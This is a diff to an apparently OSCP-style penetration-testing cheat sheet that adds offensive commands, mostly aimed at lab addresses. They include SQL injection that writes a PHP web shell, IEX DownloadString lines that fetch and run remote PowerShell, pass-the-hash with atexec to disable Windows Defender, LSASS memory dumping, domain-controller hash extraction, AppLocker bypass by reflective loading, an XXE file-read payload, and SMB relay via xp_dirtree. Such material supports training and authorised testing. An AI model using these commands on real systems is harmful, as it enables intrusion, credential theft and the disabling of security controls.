@@ -23,6 +23,9 @@ OSCP Links:
    -PS: Host discovery by sending TCP SYN packet to the $TOPTCP ports. This is done with a variable, because the --top-ports option is ignored for host discovery. If the host is online and the port is open, a SYN/ACK packet is replied. If the host is online but the port closed, a RST packet is returned.  
    -PU: Host discovery by sending a UDP packet to the port 40125. (If the host is online and the port closed, an ICMP Port Unreachable packet is returned if this is not firewalled).  
    -oA: Write output to file  
+   Quick Win Ports:   
+   `# nmap -n -Pn -sS -p 21,23,69,80,111,139,443,445,1433,2049,3263,3264,3306,5432,5900,6000,8080,8443,22,25,587,53,3389 -oA quick_wins_tcp_vlans -iL ranges.txt --min-hostgroup 256 --max-retries 1 --defeat-rst-ratelimit --min-rate 10000
+`   
    
    Add discovered hosts to textfile:  
    `awk '/Up$/{ print $2 }' nmap_host_discovery_arp_icmp_ip_sctp_tcp_udp.gnmap | sort -V > targets_online.txt`   
@@ -49,6 +52,9 @@ OSCP Links:
 - start with less ports until full scan is done:  
    `nmap -n -Pn --top-ports 100 --reason -sS --min-hostgroup 128 --max-retries 1 --min-rate 500 --defeat-rst-ratelimit -iL targets_online.txt -oA nmap_SYN_scan_TCP_TOP_100`  
 
+- NMAP result grepping:   
+  Get all open ports from multiple nmap scans:   
+  `# cat nmap_service_scan_udp.nmap nmap_service_scan_tcp.nmap | awk -F/ '/(tcp|udp).*open /{ print $1}' | sort -un | tr '\n' ','`   
 - NMAP Reports:  
    https://github.com/maaaaz/nmaptocsv  
    `python nmaptocsv.py -x SMBClientScan.xml -f ip-port-protocol-service-version-os >> output.csv` 
@@ -244,6 +250,8 @@ Bypasses
   `' or 1#`  
   `' or 1=1 --`  
   `' or 1=1 -- -`  
+  `id=1'+OR+1=1--#`   
+  `id=1\n'+OR+1=1--#`   
 
 Queries
 - Upload php command injection file:  
@@ -251,7 +259,19 @@ Queries
 - Load file:  
   `union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6` 
 
-MSSQL 
+MySQL 
+- Enumerate tables:  
+  `http://10.11.14.101/comment.php?id=769 union all select 1,2,3,4,table_name,6 FROM information_schema.tables` 
+- Get columns of specific table:  
+  `http://10.11.14.101/comment.php?id=769 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'` 
+- Get content of table:  
+  `http://10.11.14.101/comment.php?id=769 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users`  
+- Create new php file with cmd.exe:  
+  `http://10.11.14.101/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'`  
+- Use the new page with params:  
+  `http://10.11.14.101/backdoor.php?cmd=whoami`  
+
+## MSSQL    
 - Nmap scripts with db credentials:  
   `# nmap -n -Pn -p1433 --script "ms-sql-* and not ms-sql-brute" --script-args mssql.username=sa,mssql.password=<pw> 10.11.1.31`  
 - Impacket mssqlclient.py:   
@@ -270,22 +290,20 @@ MSSQL
   Using PowerUpSQL:  
   `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')`  
   `$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username "domain\user" -password "passw0rd123" | Where-Object {$_.Status -like "Accessible"}`  
-`Invoke-SQLAudit -Verbose -Instance "servername.domain.local,1433"`  
+  `Invoke-SQLAudit -Verbose -Instance "servername.domain.local,1433"`  
+  Manually get all SQL SPNs from list of reachable SQL servers:   
+  `# add all sql targets to a file called sql_hosts.txt`   
+  `# get all SPNs into a file:`   
+  `foreach($entry in (Get-Content .\sql_hosts.txt)){ $dnsname = (Resolve-DnsName $entry).Namehost; setspn -q *MSSQL*/*$dnsname* | select-string "MSSQL" | Out-File sql_instances.txt -Append }`   
+
+  `# import PowerUpSQL and run the SQLAudit on all instances`   
+  `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')`   
+  `foreach($item in ((Get-Content .\sql_instances.txt).trim() | ? {$_ -ne ""})){ Invoke-SQLAudit -Verbose -Instance "$item"}`   
+
   SMB Relay through xp_dirtree:  
   Run responder on kali with `/opt/Responder/Responder.py -I eth0 -w -r -f -d`   
   Initiate connection on xp_dirtree vulnerable sql server: `Get-SQLQuery -Verbose -Instance "servername.domain.local,1433" -Query "EXEC master.sys.xp_dirtree '\\<kali-ip>\test123'"`   
-  
-MySQL 
-- Enumerate tables:  
-  `http://10.11.14.101/comment.php?id=769 union all select 1,2,3,4,table_name,6 FROM information_schema.tables` 
-- Get columns of specific table:  
-  `http://10.11.14.101/comment.php?id=769 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'` 
-- Get content of table:  
-  `http://10.11.14.101/comment.php?id=769 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users`  
-- Create new php file with cmd.exe:  
-  `http://10.11.14.101/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'`  
-- Use the new page with params:  
-  `http://10.11.14.101/backdoor.php?cmd=whoami`  
+  or: `Get-SQLQuery -Instance servername.domain.local -Query "xp_fileexist '\\<kaliip>\file'" -Verbose | out-null`   
 
 ## File inclusion
 - LFI: http://target.com/?page=home --> http://target.com/?page=./../../../../../../../../../etc/passwd%00
@@ -401,6 +419,7 @@ PHP:
 - `smbget -R smb://1.1.1.1/folder` 
 - LOLBins Windows: https://lolbas-project.github.io/
 - LOLBins Linux: https://gtfobins.github.io/
+- Updog (https://github.com/sc0tfree/updog) --> `updog -d /tmp/www/ -p 443 --password Sugus --ssl`   
 
 ## PrivEsc Windows
 - https://github.com/itm4n/PrivescCheck   
@@ -482,6 +501,8 @@ If you have path traversal plus a location with write access you can exploit tha
 - capture traffic from specific port:  
   `tcpdump -s 0 port ftp or ssh -i eth0 -w mycap.pcap`  
   `tcpdump -s 0 port 3389 -i eth0 -w mycap.pcap`  
+  Listen for NetBIOS, SMB, RPC:   
+  `tcpdump -i eth0 'port 137 || 138 || 139 || 445'`   
 
 ## Searching stuff
 - search folder and subfolders for a string, output results and save results to file:   
@@ -519,6 +540,8 @@ If you have path traversal plus a location with write access you can exploit tha
   `secretsdump.py ralph/user1@10.11.1.31 -hashes aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f`  
 - open cmd.exe on remote target with known hash:  
   `/usr/share/doc/python-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:175a592f3b0c0c5f02fad40c51412d3a Administrator@10.11.1.202 cmd.exe`  
+  If psexec is not possible because of AntiVirus, try atexec (and e.g. disable defender):   
+  `atexec.py -hashes :e481ed3ed667f5df3c3c3b0dc37ca25f9 winattacklab.local/ffast@10.0.1.100 "powershell -c Set-MpPreference -DisableRealtimeMonitoring \$true"`   
 - Open remote connection with known hash using wmiexec:  
   `wmiexec.py ralph/user1@10.11.1.31 -hashes aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f`  
 - connect to target with evil-winrm:   
@@ -558,10 +581,26 @@ If you have path traversal plus a location with write access you can exploit tha
   `C:\> reg.exe save hklm\security c:\temp\security.save`   
   `C:\> reg.exe save hklm\system c:\temp\system.save`   
   `# secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`   
+- Using PowerShell:   
+  `Powershell -c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [process ID of lsass.exe] c:\temp\candies.bin full`   
+- Extract specific users creds from DC:   
+  `impacket-secretsdump 'domain.local/username:password'@<DC-IP> -just-dc-user <username> -just-dc-ntlm`   
     
 ## Bypass Applocker
 - Bypass Applocker with mimilib.dll to run arbitrary executables:  
   `rundll32 c:\path\mimilib.dll,start d:\otherpath\a.exe`  
+- Run PowerShell.exe via wmic.exe:   
+  `wmic.exe process call create "cmd /c powershell"`   
+- Load a binary into byte array and run it from powershell:   
+  `[byte[]]$bytes = get-content -encoding byte -path C:\Users\username\Desktop\Snaffler.exe`   
+  `$asm = [System.Reflection.Assembly]::Load($bytes)`   
+  `$vars = New-Object System.Collections.Generic.List[System.Object]`   
+  `$vars.Add("-s")`   
+  `$vars.Add("-o")`   
+  `$vars.Add("snaffler.log")`   
+  `$passed = [string[]]$vars.ToArray()`   
+  `$asm.EntryPoint.Invoke($null, @(,$passed))`   
+
 
 ## Metasploit
 - Multihandler:
@@ -594,6 +633,12 @@ If you have path traversal plus a location with write access you can exploit tha
   `pip install pyftpdlib`  
   Run (-w flag allows anonymous write access)  
   `python -m pyftpdlib -p 21 -w` 
+
+## XXE
+- Payload in office document   
+  Locate data in the Excel / Word which is parsed by the web app (e.g. by opening the office document in VIM or 7zip) and insert xxe payload:   
+  `<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>`   
+  Wherever the value is added, replace the value with "&ent;"   
 
 ## Compiling
 - Compiling a C program:  
@@ -636,3 +681,5 @@ If you have path traversal plus a location with write access you can exploit tha
   `"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )`  
 
 Generate shellcode (may need to use different encoder due to huge list of bad characters. x86/fnstenv_mov may help)
+
+## 
